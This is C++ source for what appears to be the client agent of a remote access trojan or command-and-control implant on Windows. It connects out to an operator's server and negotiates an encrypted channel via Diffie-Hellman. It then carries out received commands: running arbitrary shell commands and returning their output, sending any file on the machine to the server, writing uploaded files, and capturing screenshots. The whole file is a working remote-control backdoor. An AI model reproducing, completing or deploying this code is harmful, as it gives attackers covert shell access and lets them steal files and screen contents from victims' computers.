#include "Agent.h"

bool Agent::Connect(PCSTR ip, PCSTR port)
{
	connSocket = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (not connSocket.Create())
	{
		std::cerr << "Error at Create." << std::endl;
		return false;
	}

	std::cout << "[+] Client socket successfully created." << std::endl;

	if (not connSocket.Connect(ip, port))
	{
		std::cerr << "Error at Connect" << std::endl;
		connSocket.Close();
		return false;
	}

	std::cout << "[+] Client successfully connected." << std::endl;

	serverConn = Connection(connSocket.GetSocketHandle(), ip, port);
	OnConnect(serverConn);

	return true;
}

bool Agent::OnConnect(Connection connection)
{
	Packet packet;

	BCRYPT_ALG_HANDLE exchDH = NULL;
	BCRYPT_KEY_HANDLE keyPair = NULL;
	BCryptBufferDesc ParameterList = { 0 };
	BCryptBuffer BufferArray[2] = { 0 };
	std::vector<BYTE> pubBlob;
	std::vector<BYTE> clientHello(32);
	std::vector<BYTE> serverHello(32);
	std::vector<BYTE> seed(64);
	LPCWSTR Label = L"master secret";

	// generate client hello bytes
	auto optClientHello = EasyBCrypt::GenerateRandomBytes(32);
	if (auto out = std::get_if<EasyBCrypt::STATUS>(&optClientHello))
	{
		std::string err = std::move(*(*out));
		std::cerr << err << std::endl;
		return false;
	}

	clientHello = std::get<std::vector<BYTE>>(optClientHello);

	// send the clientHello
	packet << clientHello;
	if (not connection.SendPacket(packet))
	{
		std::cerr << "Failed to send clientHello packet. Error status: " << GetLastError() << std::endl;
		return false;
	}

	// receive serverHello
	if (not connection.RecvPacket(packet))
	{
		std::cerr << "Failed to receive serverHello packet. Error status: " << GetLastError() << std::endl;
		return false;
	}

	try
	{
		packet >> serverHello;
	}

	catch (const PacketException& e)
	{
		std::cout << e.what() << std::endl;
		return false;
	}
	
	seed.assign(clientHello.begin(), clientHello.end());
	seed.insert(seed.end(), serverHello.begin(), serverHello.end());
	
	// KDF parameters
	//specify secret to append
	BufferArray[0].BufferType = KDF_TLS_PRF_SEED;
	BufferArray[0].cbBuffer = seed.size();
	BufferArray[0].pvBuffer = (PVOID)&seed[0];

	//specify secret to prepend
	BufferArray[1].BufferType = KDF_TLS_PRF_LABEL;
	BufferArray[1].cbBuffer = (DWORD)((wcslen(Label) + 1) * sizeof(WCHAR));
	BufferArray[1].pvBuffer = (PVOID)Label;

	ParameterList.cBuffers = 2;
	ParameterList.pBuffers = BufferArray;
	ParameterList.ulVersion = BCRYPTBUFFER_VERSION;

	// create Diffie Hellman parameter blob
	std::shared_ptr<BYTE[]> paramBlob = EasyBCrypt::CreateDHParamBlob();

	// Generate keypair
	auto optClientPubBlob = EasyBCrypt::GenerateDHKeyPair(paramBlob, exchDH, keyPair);
	if (auto out = std::get_if<EasyBCrypt::STATUS>(&optClientPubBlob))
	{
		std::string err = *(*out);
		std::cout << err << std::endl;
		return false;
	}

	// send client pubBlob to server
	pubBlob = std::get<std::vector<BYTE>>(optClientPubBlob);
	packet.Clear();
	packet << pubBlob;

	if (not connection.SendPacket(packet))
	{
		std::cerr << "Failed to send pubBlob packet. Error status: " << GetLastError() << std::endl;
		return false;
	}

	// receive the server pubBlob
	if (not connection.RecvPacket(packet))
	{
		std::cerr << "Failed to receive server pubBlob packet. Error status: " << GetLastError() << std::endl;
		return false;
	}

	try
	{
		packet >> pubBlob;
	}

	catch (const PacketException& e)
	{
		std::cout << e.what() << std::endl;
		return false;
	}

	// Generate secret agreement
	auto optSecret = EasyBCrypt::GenerateDHSecret(exchDH, keyPair, pubBlob, BCRYPT_KDF_TLS_PRF, &ParameterList);
	if (auto out = std::get_if<EasyBCrypt::STATUS>(&optSecret))
	{
		std::string err = *(*out);
		std::cout << err << std::endl;
		return false;
	}

	packet.Clear();

	// 48 bytes shared secret
	std::vector<BYTE> sharedSecret = std::get<std::vector<BYTE>>(optSecret);

	// initialize a cipher object
	std::vector<BYTE> key(sharedSecret.begin(), sharedSecret.begin() + 16);

	packet << command.GetCurrentDir();

	try
	{
		serverConn.Crypt = Crypter(key);
		serverConn.Crypt.EncryptPacket(packet);
	}

	catch (const CrypterException& e)
	{
		std::cout << e.what() << std::endl;
		return false;
	}

	if (not connection.SendPacket(packet))
	{
		std::cerr << "Failed to send packet. Error Status: " << GetLastError() << std::endl;
		return false;
	}

	return true;
}


bool Agent::ShutDown()
{
	if (not connSocket.Close())
	{
		std::cerr << "Error at Close." << std::endl;
		return false;
	}
	
	return true;
}

bool Agent::Logic()
{
	Packet packet;
	CommandType type;

	if (not serverConn.RecvPacket(packet))
	{
		std::cerr << "Error at RecvPacket." << std::endl;
		return false;
	}

	try
	{
		serverConn.Crypt.DecryptPacket(packet);
		type = static_cast<CommandType>(packet.GetPacketType());

		if (type == CommandType::agentdown)
		{
			return false;
		}

		else if (type == CommandType::upload)
		{
			std::string path;
			uint32_t bytesToRead;
			packet >> path >> bytesToRead;

			// check if the specified remotepath exist
			std::filesystem::path _path(path);
			if (std::filesystem::exists(_path.parent_path()) and std::filesystem::is_directory(_path.parent_path()))
			{
				// send valid packet and continue receving the content
				packet.Clear(PacketType::response);
				serverConn.Crypt.EncryptPacket(packet);

				if (not serverConn.SendPacket(packet))
				{
					std::cerr << "Error at SendPacket (path existence)" << std::endl;
					return false;
				}

				if (not serverConn.RecvFile(path, bytesToRead))
				{
					std::cerr << "Error at RecvFile." << std::endl;
					return false;
				}
			}

			else
			{
				// send invalid packet and return
				packet.Clear(PacketType::Invalid);
				serverConn.Crypt.EncryptPacket(packet);

				if (not serverConn.SendPacket(packet))
				{
					std::cerr << "Error at SendPacket (path existence)" << std::endl;
					return false;
				}
			}	
		}

		else if (type == CommandType::download)
		{
			std::string path;
			packet >> path;

			if (std::filesystem::exists(path))
			{
				uintmax_t filesize = std::filesystem::file_size(path);

				packet.Clear(PacketType::response);
				packet << filesize;

				serverConn.Crypt.EncryptPacket(packet);

				if (not serverConn.SendPacket(packet))
				{
					std::cerr << "Error at SendPacket (download)." << std::endl;
					return false;
				}

				if (not serverConn.SendFile(path, filesize))
				{
					std::cerr << "Error at SendFile." << std::endl;
					return false;
				}
			}

			else
			{
				packet.Clear(PacketType::Invalid);
				serverConn.Crypt.EncryptPacket(packet);

				if (not serverConn.SendPacket(packet))
				{
					std::cerr << "Error at SendPacket (download)." << std::endl;
					return false;
				}
			}
		}

		else if (type == CommandType::screenshot)
		{
			std::vector<BYTE> imageBytes;

			command.TakeScreenshot(imageBytes);
			packet << imageBytes;

			//serverConn.Crypt.EncryptPacket(packet);

			if (not serverConn.SendPacket(packet))
			{
				std::cerr << "Error at Send (image bytes)." << std::endl;
				return false;
			}
		}

		else
		{
			if (type == CommandType::changedir)
			{
				std::string newCurrentDir;
				packet >> newCurrentDir;

				if (command.SetCurrentDir(newCurrentDir))
				{
					packet.Clear(PacketType::response);
					packet << " " + command.GetCurrentDir() + "\n";
				}

				else
				{
					packet.Clear(PacketType::Invalid);
					packet << "The system cannot find the path specified.\n";
				}
			}

			else
			{
				std::string cmd;
				packet >> cmd;

				if (not command.Execute(cmd))
				{
					std::cerr << "Error at Execute" << std::endl;
					return false;
				}

				packet.Clear(PacketType::response);
				packet << command.GetOutput();
			}

			serverConn.Crypt.EncryptPacket(packet);

			if (not serverConn.SendPacket(packet))
			{
				std::cerr << "Error at SendPacket (commandline)." << std::endl;
				return false;
			}
		}
	}

	catch (const CrypterException& e)
	{
		std::cout << e.what() << std::endl;
		return false;
	}

	catch (const PacketException& e)
	{
		std::cout << e.what() << std::endl;
		return false;
	}

	return true;
}
